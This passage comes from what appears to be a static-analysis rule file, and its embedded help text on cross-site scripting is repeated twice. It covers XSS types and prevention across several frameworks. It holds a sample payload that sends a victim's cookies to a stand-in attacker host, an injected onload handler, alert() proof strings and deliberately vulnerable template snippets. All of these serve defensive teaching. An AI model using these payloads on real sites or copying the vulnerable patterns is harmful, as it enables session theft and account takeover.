attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag `<img src=\"...\">`. An attacker with user-id `1337` specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\n```html\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n```\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\n```javascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(`<img src=\"${res.avatarURL}\">`));\n```\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the `Content-Security-Policy` (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an `<iframe>` with the `sandbox` attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\n```html\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n```\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n```\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n```\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use \n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache \n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the `bypassSecurityTrust*` functions in the `DomSanitizer` object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\n```typescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n```\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as `&lt;&quot;script&quot;&gt;` when rendering the HTML, safely defusing any\npotential XSS attacks:\n\n```html\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n```\n\nThis can be overridden using the `Html.Raw()` method - opening up the possibility of XSS attacks:\n\n```html\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n```\n\nCarefully audit every use of `Html.Raw()` to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the `System.Web.HttpUtility.HtmlEncode()` method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe `html/template` package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\n```go\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n```\n\n...writes escaped HTML to the `out` variable. This is in contrast to the `text/template` package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the `html/template.HTMLEscapeString()` function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\n```javascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the `escape-html` Node module:\n\n```javascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n```\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way your templates can become vulnerable is by adding the `{% autoescape false %}` directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping any\ndynamic content possibly coming from an untrusted source. In Python, the builtin `html` module provides the `escape()` function for this purpose:\n\n```python\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n```\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\n```jsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n```\n\nTo disable auto-escaping in React, you would use the property `dangerouslySetInnerHTML`. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\n```jsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n```\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\n```html\n<p>\n  @(article.content)\n</p>\n```\n\nYou can opt out of this protection by using `@Html()`. Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\n```html\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the `play.api.templates.HtmlFormat.escape()` method for this. Other options are the\n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache\n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\n```php\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n```\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: `<script>alert('XSS!');</script>`\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in `htmlspecialchars` function:\n\n```php\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n```\n\nBy using `htmlspecialchars`, the input string is made safe for displaying in HTML by converting characters like `<` and `>` into their respective HTML entities (`&lt;` and `&gt;`), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use `htmlspecialchars` or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against `<script>` tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html)."
              },
              "name": "Cross-siteScripting",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "fullDescription": {
                "text": "Attacker-Controlled data is used as HTML content. This indicates a Cross-Site-Scripting (XSS) vulnerability."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Cross-Site Scripting"
              }
            },
            {
              "id": "http-to-log",
              "help": {
                "text": "Attacker-Controlled data is used as HTML content. This indicates a Cross-Site-Scripting (XSS) vulnerability.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the search query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this <script> tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag <img src=\"...\">. An attacker with user-id 1337 specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\nhtml\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\njavascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(<img src=\"${res.avatarURL}\">));\n\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the Content-Security-Policy (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an <iframe> with the sandbox attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\nhtml\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\nhtml\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n\n\nhtml\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use \norg.apache.commons.lang.StringEscapeUtils.escapeHtml() method from the Apache \ncommons-lang library or the org.springframework.web.util.HtmlUtils class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the bypassSecurityTrust* functions in the DomSanitizer object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\ntypescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as &lt;&quot;script&quot;&gt; when rendering the HTML, safely defusing any\npotential XSS attacks:\n\nhtml\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n\n\nThis can be overridden using the Html.Raw() method - opening up the possibility of XSS attacks:\n\nhtml\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n\n\nCarefully audit every use of Html.Raw() to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the System.Web.HttpUtility.HtmlEncode() method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe html/template package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\ngo\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse({{define \"T\"}}Hello, {{.}}!{{end}})\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n\n\n...writes escaped HTML to the out variable. This is in contrast to the text/template package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the html/template.HTMLEscapeString() function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the safe keyword (which tells the template engine you consider the source trustworthy):\n\n\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\njavascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the escape-html Node module:\n\njavascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the safe keyword (which tells the template engine you consider the source trustworthy):\n\n\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n\n\nAnother way your templates can become vulnerable is by adding the {% autoescape false %} directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping any\ndynamic content possibly coming from an untrusted source. In Python, the builtin html module provides the escape() function for this purpose:\n\npython\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\njsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n\n\nTo disable auto-escaping in React, you would use the property dangerouslySetInnerHTML. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\njsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\nhtml\n<p>\n  @(article.content)\n</p>\n\n\nYou can opt out of this protection by using @Html(). Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\nhtml\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the play.api.templates.HtmlFormat.escape() method for this. Other options are the\norg.apache.commons.lang.StringEscapeUtils.escapeHtml() method from the Apache\ncommons-lang library or the org.springframework.web.util.HtmlUtils class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\nphp\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: <script>alert('XSS!');</script>\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in htmlspecialchars function:\n\nphp\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n\n\nBy using htmlspecialchars, the input string is made safe for displaying in HTML by converting characters like < and > into their respective HTML entities (&lt; and &gt;), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use htmlspecialchars or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against <script> tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html).",
